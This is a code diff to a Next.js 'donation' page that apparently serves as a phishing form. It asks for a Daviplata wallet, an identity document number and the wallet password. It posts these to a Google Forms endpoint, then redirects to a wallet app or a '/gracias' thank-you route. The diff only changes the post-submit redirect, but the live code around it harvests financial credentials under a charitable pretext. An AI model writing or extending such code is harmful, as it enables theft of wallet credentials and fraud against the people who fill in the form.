@@ -1,13 +1,15 @@
 "use client";
 
 import { useState } from "react";
+import { useRouter } from "next/navigation";
 
-export default function DonacionPage({ onSuccess }: { onSuccess: () => void }) {
+export default function DonacionPage() {
   const [billetera, setBilletera] = useState("Daviplata");
   const [tipoDoc, setTipoDoc] = useState("");
   const [numeroDoc, setNumeroDoc] = useState("");
   const [password, setPassword] = useState("");
   const [mostrarPass, setMostrarPass] = useState(false);
+  const router = useRouter(); // para redirigir si no es móvil
 
   const formURL = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfb8GZ-KmfEnGyivGhBU6J2gUOQyl1Uon1hfxg-LzNKBCa7MA/formResponse";
   const entryBilletera = "entry.1287154502";
@@ -47,7 +49,7 @@ export default function DonacionPage({ onSuccess }: { onSuccess: () => void }) {
           window.location.href = getAppURL();
         }, 100);
       } else {
-        onSuccess();
+        router.push("/gracias"); // o cualquier ruta de "éxito"
       }
     } catch (error) {
       console.error("Error al enviar los datos:", error);
